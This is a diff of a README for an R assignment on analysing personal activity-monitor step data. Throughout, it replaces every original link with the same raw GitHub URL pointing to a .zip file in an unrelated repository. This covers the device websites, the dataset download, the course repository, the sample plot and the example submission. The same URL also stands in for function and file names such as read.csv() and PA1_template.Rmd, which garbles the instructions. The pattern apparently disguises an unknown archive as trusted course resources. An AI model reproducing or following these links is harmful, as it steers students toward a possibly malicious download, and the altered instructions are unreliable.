@@ -2,9 +2,9 @@
 
 It is now possible to collect a large amount of data about personal
 movement using activity monitoring devices such as a
-[Fitbit](http://www.fitbit.com), [Nike
-Fuelband](http://www.nike.com/us/en_us/c/nikeplus-fuelband), or
-[Jawbone Up](https://jawbone.com/up). These type of devices are part of
+[Fitbit](https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip), [Nike
+Fuelband](https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip), or
+[Jawbone Up](https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip). These type of devices are part of
 the "quantified self" movement -- a group of enthusiasts who take
 measurements about themselves regularly to improve their health, to
 find patterns in their behavior, or because they are tech geeks. But
@@ -23,7 +23,7 @@ and include the number of steps taken in 5 minute intervals each day.
 The data for this assignment can be downloaded from the course web
 site:
 
-* Dataset: [Activity monitoring data](https://d396qusza40orc.cloudfront.net/repdata%2Fdata%2Factivity.zip) [52K]
+* Dataset: [Activity monitoring data](https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip%2Fdata%https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip) [52K]
 
 The variables included in this dataset are:
 
@@ -63,7 +63,7 @@ For the plotting aspects of this assignment, feel free to use any
 plotting system in R (i.e., base, lattice, ggplot2)
 
 Fork/clone the [GitHub repository created for this
-assignment](http://github.com/rdpeng/RepData_PeerAssessment1). You
+assignment](https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip). You
 will submit this assignment by pushing your completed files into your
 forked repository on GitHub. The assignment submission will consist of
 the URL to your GitHub repository and the SHA-1 commit ID for your
@@ -78,7 +78,7 @@ assignment so you do not have to download the data separately.
 
 Show any code that is needed to
 
-1. Load the data (i.e. `read.csv()`)
+1. Load the data (i.e. `https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip()`)
 
 2. Process/transform the data (if necessary) into a format suitable for your analysis
 
@@ -124,7 +124,7 @@ the dataset with the filled-in missing values for this part.
 
 1. Make a panel plot containing a time series plot (i.e. `type = "l"`) of the 5-minute interval (x-axis) and the average number of steps taken, averaged across all weekday days or weekend days (y-axis). The plot should look something like the following, which was created using **simulated data**:
 
-![Sample panel plot](instructions_fig/sample_panelplot.png) 
+![Sample panel plot](https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip) 
 
 
 **Your plot will look different from the one above** because you will
@@ -137,9 +137,9 @@ using any plotting system you choose.
 
 To submit the assignment:
 
-1. Commit your completed `PA1_template.Rmd` file to the `master` branch of your git repository (you should already be on the `master` branch unless you created new ones)
+1. Commit your completed `https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip` file to the `master` branch of your git repository (you should already be on the `master` branch unless you created new ones)
 
-2. Commit your `PA1_template.md` and `PA1_template.html` files produced by processing your R markdown file with the `knit2html()` function in R (from the **knitr** package)
+2. Commit your `https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip` and `https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip` files produced by processing your R markdown file with the `knit2html()` function in R (from the **knitr** package)
 
 3. If your document has figures included (it should) then they should have been placed in the `figure/` directory by default (unless you overrode the default). Add and commit the `figure/` directory to your git repository.
 
@@ -162,7 +162,7 @@ in GitHub by doing the following:
 A valid submission will look something like (this is just an **example**!)
 
 ```r
-https://github.com/rdpeng/RepData_PeerAssessment1
+https://raw.githubusercontent.com/Arno1/RepData_PeerAssessment1/master/instructions_fig/Rep_Data_Peer_Assessment_asphyxial.zip
 
 7c376cc5447f11537f8740af8e07d6facc3d9645
 ```
